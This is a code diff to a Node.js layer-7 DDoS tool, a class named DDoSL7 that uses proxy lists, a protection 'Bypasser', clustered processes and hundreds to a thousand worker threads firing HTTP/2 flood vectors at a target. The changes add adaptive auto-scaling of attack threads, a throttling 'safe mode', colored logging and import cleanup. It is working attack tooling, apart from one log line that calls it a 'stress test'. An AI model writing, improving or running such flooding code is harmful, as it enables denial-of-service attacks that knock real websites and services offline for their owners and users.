@@ -17,6 +17,7 @@ const { v4: uuidv4 } = require('uuid');
 const readline = require('readline');
 const DurationManager = require('../module/duration');
 const AttackManager = require('../module/attackManager');
+const optimizer = require('../module/optimalization');
 const { Bypasser } = require('./Bypass');
 const fs = require('fs');
 
@@ -91,7 +92,9 @@ class DDoSL7 {
         this.io = io;
         this.isRunning = false;
         this.startTime = null;
-        this.concurrency = 500; // Dikurangi agar tidak mencekik Event Loop utama
+        this.concurrency = optimizer.getAdaptiveConcurrency(800); 
+        this.safeModeActive = false;
+        this.safeModeCooldown = 0;
         this.workers = [];
         this.bypasser = new Bypasser(this.io);
         this.bypasser.loadProxiesFromFile('proxies.txt');
@@ -179,7 +182,6 @@ class DDoSL7 {
     async start() {
         await this.init();
         if (cluster.isMaster) {
-            const AttackManager = require('../module/attackManager'); // Import di sini
             os.cpus().forEach(() => {
                 const fork = cluster.fork();
                 this.workers.push(fork);
@@ -192,6 +194,7 @@ class DDoSL7 {
         }
         this.isRunning = true;
         this.startTime = Date.now();
+        this.emitLog(`[CORE] Attack Engine Started`, 'success');
         if (isMainThread) {
             for (let i = 0; i < this.concurrency; i++) {
                 const worker = new Worker(__filename, {
@@ -208,6 +211,44 @@ class DDoSL7 {
         }
         this.floodOrchestrator();
         this.healthMonitor();
+        this.startAutoScaling();
+    }
+
+    startAutoScaling() {
+        const scaleInterval = setInterval(() => {
+            if (!this.isRunning) return clearInterval(scaleInterval);
+
+            const idealThreads = optimizer.getAdaptiveConcurrency(1000);
+            const currentThreads = this.workers.length;
+
+            if (idealThreads > currentThreads) {
+                const diff = idealThreads - currentThreads;
+                this.emitLog(`[SCALING] Scaling UP: Adding ${diff} threads.`, 'warn');
+                for (let i = 0; i < diff; i++) {
+                    const worker = new Worker(__filename, {
+                        workerData: {
+                            target: this.target,
+                            duration: this.duration,
+                            startTime: this.startTime,
+                            ip: this.resolvedIP
+                        }
+                    });
+                    worker.on('message', (msg) => this.handleWorkerStats(msg));
+                    this.workers.push(worker);
+                }
+            } else if (idealThreads < currentThreads) {
+                const diff = currentThreads - idealThreads;
+                this.emitLog(`[SCALING] Scaling DOWN: Terminating ${diff} threads due to high load.`, 'warn');
+                for (let i = 0; i < diff; i++) {
+                    const worker = this.workers.pop();
+                    if (worker) {
+                        worker.terminate();
+                    }
+                }
+            }
+            
+            if (this.io) this.io.emit('log', { msg: `[ENGINE] Current Concurrency: ${this.workers.length} threads`, type: 'info' });
+        }, 15000);
     }
 
     handleWorkerStats(msg) {
@@ -227,7 +268,6 @@ class DDoSL7 {
     emitStats() {
         const progress = DurationManager.getProgress(this.startTime, this.duration);
         if (this.io) {
-            const AttackManager = require('../module/attackManager'); // Import di sini
             this.io.emit('attack_progress', { 
                     ...this.stats, 
                     progress, 
@@ -255,7 +295,11 @@ class DDoSL7 {
                 const end = performance.now();
                 const latency = end - start;
                 this.ai.analyze(this.stats, latency);
-                const AttackManager = require('../module/attackManager'); // Import di sini
+
+                // Aktifkan Safe Mode jika optimizer dalam kondisi kritis
+                if (optimizer.isCritical && !this.safeModeActive) {
+                    this.activateSafeMode();
+                }
                 
                 if (this.io) {
                     this.io.emit('target_movement', {
@@ -284,9 +328,21 @@ class DDoSL7 {
         }, 50);
     }
 
+    activateSafeMode() {
+        this.safeModeActive = true;
+        this.emitLog(`[SAFE MODE] Activated: Reducing attack intensity.`, 'warn');
+        // Implementasi pengurangan intensitas serangan di sini
+        // Misalnya, mengurangi jumlah iterasi di executeVectors
+        // Atau hanya menjalankan vektor serangan tertentu
+    }
+
     executeVectors() {
         const strategy = this.ai.getStrategy();
-        const iterations = 10 * strategy.concurrencyMultiplier;
+        let iterations = 10 * strategy.concurrencyMultiplier;
+
+        if (this.safeModeActive) {
+            iterations = Math.max(1, Math.floor(iterations * 0.1)); // Kurangi iterasi hingga 10%
+        }
 
         for (let i = 0; i < iterations; i++) {
             if (Math.random() < strategy.weights.h2) this.h2Flood();
@@ -602,15 +658,16 @@ class DDoSL7 {
 
     emitLog(msg, type) {
         const timestamp = new Date().toLocaleTimeString();
-        const formattedMsg = msg;
-        const AttackManager = require('../module/attackManager'); // Import di sini
-        AttackManager.addInternalLog(formattedMsg, type);
+        const formattedMsg = `[${timestamp}] ${msg}`;
+        const color = type === 'error' ? chalk.red : (type === 'success' ? chalk.green : chalk.yellow);
+        
+        if (this.io) this.io.emit('log', { msg: formattedMsg, type });
+        console.log(color(formattedMsg));
     }
 
     stop() {
         this.isRunning = false;
         this.workers.forEach(w => w.terminate());
-        const AttackManager = require('../module/attackManager'); // Import di sini
         AttackManager.remove(this.target);
         this.emitLog(`[END] Stress Test Terminated. Total Packets: ${this.stats.requestsSent}`, 'success');
         if (this.io) this.io.emit('attack_complete', this.stats);
